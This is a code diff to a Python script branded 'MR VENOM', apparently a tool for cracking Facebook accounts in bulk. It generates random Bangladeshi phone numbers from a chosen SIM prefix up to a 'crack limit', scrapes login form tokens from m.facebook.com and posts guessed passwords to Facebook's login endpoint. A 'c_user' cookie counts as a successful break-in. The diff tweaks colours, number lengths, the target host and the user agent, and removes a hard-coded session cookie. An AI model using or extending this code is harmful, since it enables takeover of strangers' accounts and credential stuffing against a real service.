@@ -78,12 +78,12 @@ for sat in range(1000):
     uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
     ugen.append(uaku2)
 logo=("""
-\x1b[1;90m██╗░░░██╗███████╗███╗░░██╗░█████╗░███╗░░░███╗
-\x1b[1;90m██║░░░██║██╔════╝████╗░██║██╔══██╗████╗░████║
-\x1b[1;90m╚██╗░██╔╝█████╗░░██╔██╗██║██║░░██║██╔████╔██║
-\x1b[1;90m░╚████╔╝░██╔══╝░░██║╚████║██║░░██║██║╚██╔╝██║
-\x1b[1;90m░░╚██╔╝░░███████╗██║░╚███║╚█████╔╝██║░╚═╝░██║
-\x1b[1;90m░░░╚═╝░░░╚══════╝╚═╝░░╚══╝░╚════╝░╚═╝░░░░░╚═╝
+\x1b[1;36m██╗░░░██╗███████╗███╗░░██╗░█████╗░███╗░░░███╗
+\x1b[1;36m██║░░░██║██╔════╝████╗░██║██╔══██╗████╗░████║
+\x1b[1;36m╚██╗░██╔╝█████╗░░██╔██╗██║██║░░██║██╔████╔██║
+\x1b[1;93m░╚████╔╝░██╔══╝░░██║╚████║██║░░██║██║╚██╔╝██║
+\x1b[1;93m░░╚██╔╝░░███████╗██║░╚███║╚█████╔╝██║░╚═╝░██║
+\x1b[1;93m░░░╚═╝░░░╚══════╝╚═╝░░╚══╝░╚════╝░╚═╝░░░░░╚═╝
 \033[1;96m═════════════════════════════════════════════
 \x1b[1;36m{+} \x1b[1;91mTOOL CREATED BY   \x1b[1;97m: MR VENOM
 \x1b[1;36m{+} \x1b[1;92mGITHUB NAME       \x1b[1;97m: \x1b[1;94mMrvenom01
@@ -107,10 +107,10 @@ def fuck():
     os.system('clear')
     os.system('xdg-open https://www.facebook.com/profile.php?id=Rowdybrandx')
     print(logo)
-    print('[+] SIM CODE BD=> 016•017•018•019')
+    print('[+] SIM CODE BD=> 016×017•018×019')
     nude = input('\033[1;32m[\033[1;32m?\033[1;32m] SIM CODE : ')
-    nudex = ''.join(random.choice(string.digits) for _ in range(2))
-    nud = ''.join(random.choice(string.digits) for _ in range(2))
+    nudex = ''.join(random.choice(string.digits) for _ in range(7))
+    nud = ''.join(random.choice(string.digits) for _ in range(8))
     print('[+] 2000•5000•10000•15000•50000')
     limit = int(input('[?] ENTER YOUR CRACK LIMIT : '))
     for nmbr in range(limit):
@@ -145,7 +145,7 @@ def rcrack(uid,pwx,tl):
             bi = random.choice([A,B,C,D,E,F,G,H])
             sys.stdout.write(f'\r \033[1;31m[%sVENOM\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
             sys.stdout.flush()
-            free_fb = session.get('https://free.facebook.com').text
+            free_fb = session.get('https://m.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -162,7 +162,6 @@ def rcrack(uid,pwx,tl):
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
-            # 'cookie': 'datr=Y-7uZFG0GUlj4TPqdjCBYG-v; sb=Y-7uZGILVAggCTLlTa7rzkwp; m_pixel_ratio=1.712499976158142; wd=421x812; fr=0UJBTWfwgn2uF4iit..Bk7u5j.ro.AAA.0.0.Bk7u5q.AWXthkUvsFE',
             'dpr': '1.712499976158142',
             'sec-ch-prefers-color-scheme': 'light',
             'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
@@ -176,8 +175,7 @@ def rcrack(uid,pwx,tl):
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-            'viewport-width': '980',}
+            'user-agent': pro,}
             lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
